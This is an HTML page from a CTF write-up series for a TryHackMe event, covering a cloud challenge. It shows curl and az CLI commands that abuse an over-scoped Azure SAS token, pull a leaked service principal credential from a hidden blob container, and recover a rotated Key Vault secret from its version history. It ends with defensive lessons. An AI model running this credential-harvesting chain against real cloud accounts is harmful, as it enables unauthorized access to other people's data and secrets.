@@ -1,0 +1,120 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Day 09 · CryptoCabana — Hacker Holidays</title>
+<meta name="description" content="Write-ups for TryHackMe's Hacker Holidays 13-day CTF: OSINT, AI security, web exploitation, cloud, forensics and boot2root.">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=IBM+Plex+Sans:wght@400;500;600&family=IBM+Plex+Mono:wght@400;500;600&display=swap" rel="stylesheet">
+<link rel="stylesheet" href="../styles.css">
+
+</head>
+<body>
+<header class="topbar">
+  <div class="topbar-inner">
+    <a class="brand" href="../index.html">Hacker<span class="dot">.</span>Holidays</a>
+    <nav class="topnav">
+      <a href="../index.html">Intro</a>
+      <a href="../index.html#doors" class="current">Write-ups</a>
+      <a href="https://tryhackme.com/room/hackerholidays" target="_blank" rel="noopener">TryHackMe Room ↗</a>
+    </nav>
+  </div>
+</header>
+<div class="day-shell">
+  <aside class="sidebar">
+  <a class="back" href="../index.html">← Back to intro</a>
+  <button class="mobile-toggle" type="button">Jump to a day <span class="arrow">▾</span></button>
+  <div class="sidebar-title">All doors</div>
+  <ul><li><a class="" href="day-0.html"><span class="n">00</span>The Brochure</a></li><li><a class="" href="day-1.html"><span class="n">01</span>The Concierge Knows Too Much</a></li><li><a class="" href="day-2.html"><span class="n">02</span>Room 404</a></li><li><a class="" href="day-3.html"><span class="n">03</span>Complimentary</a></li><li><a class="" href="day-4.html"><span class="n">04</span>Packed Light</a></li><li><a class="" href="day-5.html"><span class="n">05</span>Beach Bar</a></li><li><a class="" href="day-6.html"><span class="n">06</span>Overheard at Breakfast</a></li><li><a class="" href="day-7.html"><span class="n">07</span>Do Not Disturb</a></li><li><a class="" href="day-8.html"><span class="n">08</span>Towel on the sunbed</a></li><li><a class="active" href="day-9.html"><span class="n">09</span>CryptoCabana</a></li><li><a class="" href="day-10.html"><span class="n">10</span>The Hollow Shell</a></li><li><a class="" href="day-12.html"><span class="n">12</span>After Hours</a></li><li><a class="" href="day-13.html"><span class="n">13</span>The Guestbook</a></li><li><a class="" href="day-14.html"><span class="n">14</span>Management Wants a Word</a></li></ul>
+</aside>
+  <main class="day-main">
+    <div class="day-header">
+      <div class="badge-row">
+        <span class="badge day">DOOR 09</span>
+        <span class="badge cat">Cloud</span>
+        <span class="badge diff-medium">Medium</span>
+      </div>
+      <h1>CryptoCabana</h1>
+    </div>
+    <div class="content">
+      <figure class="shot"><img src="../images/image91.png" alt="" loading="lazy"></figure>
+<h2>Summary</h2>
+<p>CryptoCabana is a fake &quot;seed phrase backup&quot; web app hosted on Azure Static Website hosting. The client-side JavaScript embeds an overly-permissive Azure Storage SAS token that allows listing every container in the storage account — not just the one intended for use.</p>
+<p>This exposes a hidden vault container holding a leaked service principal credential. That credential grants access to an Azure Key Vault, where the flag is split into three secret &quot;shards.&quot; One shard was rotated after &quot;IT flagged it,&quot; but Key Vault&#x27;s version history still holds the original (real) value.</p>
+<h2>Step 1; Recon the static site</h2>
+<p>Target: https://cryptocabanaf5scjagc.z13.web.core.windows.net/</p>
+<p>Pulled the raw HTML source:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/ -o index.html
+cat index.html</pre></div>
+<div class="shot-row"><figure class="shot"><img src="../images/image15.png" alt="" loading="lazy"></figure><figure class="shot"><img src="../images/image97.png" alt="" loading="lazy"></figure></div>
+<p>The page is a &quot;seed phrase backup&quot; form that calls a backupPhrase() JS function on submit, loaded from app.js.</p>
+<h2>Step 2;Pull apart what the kiosk hands out for free</h2>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s https://cryptocabanaf5scjagc.z13.web.core.windows.net/app.js -o app.js
+cat app.js</pre></div>
+<figure class="shot"><img src="../images/image38.png" alt="" loading="lazy"></figure>
+<p>app.js contains a hardcoded SAS token used to PUT backup files directly into Blob Storage from the browser:</p>
+<figure class="shot"><img src="../images/image74.png" alt="" loading="lazy"></figure>
+<p>Key finding: the SAS token&#x27;s permissions (sp=rl = read + list) and scope (srt=sco = service + container + object) are far broader than the app needs. A write-only token scoped to the backups container would have sufficed — this one can list every container in the whole storage account and read every blob in them.</p>
+<h2>Step 3; Follow the trust somewhere the page never points you</h2>
+<p>Used the leaked SAS token directly against the Blob service endpoint (not the container the app uses) to enumerate all containers:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s &quot;https://cryptocabanaf5scjagc.blob.core.windows.net/?comp=list&amp;sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=&lt;SAS_SIG&gt;&quot;</pre></div>
+<p>Result: three containers — $web (the site itself), backups (intended use), and vault — never linked from the front-end.</p>
+<figure class="shot"><img src="../images/image67.png" alt="" loading="lazy"><figcaption>Listed the hidden container:</figcaption></figure>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s &quot;https://cryptocabanaf5scjagc.blob.core.windows.net/vault?restype=container&amp;comp=list&amp;sv=2022-11-02&amp;ss=b&amp;srt=sco&amp;sp=rl&amp;se=2099-12-31T23:59:59Z&amp;st=2024-01-01T00:00:00Z&amp;spr=https&amp;sig=&lt;SAS_SIG&gt;&quot;</pre></div>
+<p>Found two blobs: backup-service-account.json and seed_phrase.txt (a decoy — a fake recovery phrase, not the flag).</p>
+<figure class="shot"><img src="../images/image70.png" alt="" loading="lazy"></figure>
+<p>Downloaded the service account file:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>curl -s &quot;https://cryptocabanaf5scjagc.blob.core.windows.net/vault/backup-service-account.json?sv=...&amp;sig=&lt;SAS_SIG&gt;&quot;
+{</pre></div>
+<p>&quot;client_id&quot;: &quot;dbcf2923-e4eb-4b72-a0a4-688aa1185cf5&quot;,</p>
+<p>&quot;client_secret&quot;: &quot;REDACTED&quot;,</p>
+<p>&quot;key_vault_name&quot;: &quot;ccabana-kv-f5scjagc&quot;,</p>
+<p>&quot;key_vault_uri&quot;: &quot;https://ccabana-kv-f5scjagc.vault.azure.net/&quot;,</p>
+<p>&quot;note&quot;: &quot;CryptoCabana backup automation account. Rotate this if it ever leaves the vault. -- IT&quot;,</p>
+<p>&quot;tenant_id&quot;: &quot;8f8c5f8e-42d3-4ceb-97ad-241bbf446d6c&quot;</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>}</pre></div>
+<p>This is &quot;what the kiosk is quietly trusting to reach into storage on its own&quot; — an Azure AD service principal with its own credentials, sitting in plaintext in a &quot;private&quot; blob container, pointing at a Key Vault the site never references.</p>
+<figure class="shot"><img src="../images/image49.png" alt="" loading="lazy"></figure>
+<p>Step 4; Authenticate as the service principal.</p>
+<figure class="shot"><img src="../images/image71.png" alt="" loading="lazy"></figure>
+<h2>Step 5; Enumerate the Key Vault</h2>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>az keyvault secret list --vault-name ccabana-kv-f5scjagc -o table</pre></div>
+<p>Four secrets: key-shard-1, key-shard-2, key-shard-3, and master-key (expired 2020-01-01 — a red herring / inaccessible via RBAC).</p>
+<figure class="shot"><img src="../images/image35.png" alt="" loading="lazy"></figure>
+<p>Reading each current value:</p>
+<p>for s in key-shard-1 key-shard-2 key-shard-3 master-key; do</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>echo &quot;=== $s ===&quot;
+az keyvault secret show --vault-name ccabana-kv-f5scjagc --name $s --query value -o tsv</pre></div>
+<p>Done</p>
+<figure class="shot"><img src="../images/image60.png" alt="" loading="lazy"></figure>
+<div class="tbl-wrap"><table class="data"><thead><tr><th>Secret</th><th>Current value</th></tr></thead><tbody><tr><td>key-shard-1</td><td>THM{n0t_ur</td></tr><tr><td>key-shard-2</td><td>&quot;Rotated this after IT flagged it -- old value should still be recoverable if you know where to look.&quot;</td></tr><tr><td>key-shard-3</td><td>ur_c01ns!}</td></tr><tr><td>master-key</td><td>403 Forbidden (this service principal lacks RBAC on it)</td></tr></tbody></table></div>
+<h2>Step 6; Recover the rotated shard from version history</h2>
+<p>key-shard-2&#x27;s current value is a decoy pointing at its own history — straight out of @0xMia&#x27;s tip: &quot;if a value looks freshly rotated, ask yourself what it looked like five minutes before that.&quot;</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>az keyvault secret list-versions --vault-name ccabana-kv-f5scjagc --name key-shard-2 --query &quot;[].id&quot; -o tsv</pre></div>
+<p>Two versions returned. Read the older one:</p>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>az keyvault secret show \</pre></div>
+<p>--id &quot;https://ccabana-kv-f5scjagc.vault.azure.net/secrets/key-shard-2/3d6492d2c6f74123bc754a9ded22b2a0&quot; \</p>
+<p>--query value -o tsv</p>
+<p>Result: _k3ys_n0t_ — the real middle shard.</p>
+<figure class="shot"><img src="../images/image16.png" alt="" loading="lazy"></figure>
+<h2>Step 7; Assemble the flag</h2>
+<div class="tbl-wrap"><table class="data"><thead><tr><th>Shard</th><th>Value</th></tr></thead><tbody><tr><td>key-shard-1</td><td>THM{n0t_ur</td></tr><tr><td>key-shard-2 (old version)</td><td>_k3ys_n0t_</td></tr><tr><td>key-shard-3</td><td>ur_c01ns!}</td></tr></tbody></table></div>
+<div class="code-block"><div class="code-bar"><span></span><span></span><span></span></div><pre>Flag: THM{n0t_ur_k3ys_n0t_ur_c01ns!}</pre></div>
+<h2>lessons</h2>
+<ol><li>Over-scoped SAS token — the front-end only needed to write a single blob into one container, but was issued a token with read + list at service scope, exposing the entire storage account&#x27;s container list.</li><li>Sensitive credentials stored in Blob Storage — a service principal&#x27;s client_secret was stored in plaintext in a blob container reachable via that same over-scoped SAS token.</li><li>Secret rotation without invalidating old versions — Key Vault secret rotation doesn&#x27;t delete prior versions by default; if a leaked secret is rotated but old versions remain readable to the same identity, the &quot;rotation&quot; provides no real protection.</li></ol>
+    </div>
+    <div class="day-pager"><a class="pager-btn prev" href="day-8.html"><span class="lbl">← Previous</span><span class="ttl">Day 08 · Towel on the sunbed</span></a><a class="pager-btn next" href="day-10.html"><span class="lbl">Next →</span><span class="ttl">Day 10 · The Hollow Shell</span></a></div>
+  </main>
+</div>
+<footer>
+  <div class="wrap">
+    Built for the TryHackMe <strong style="color:var(--text-muted)">Hacker Holidays</strong> event · write-ups for learning purposes only.<br>
+    <a href="https://tryhackme.com" target="_blank" rel="noopener">TryHackMe</a> · <a href="../index.html">Back to top</a>
+  </div>
+</footer>
+
+<script src="../script.js"></script>
+</body>
+</html>
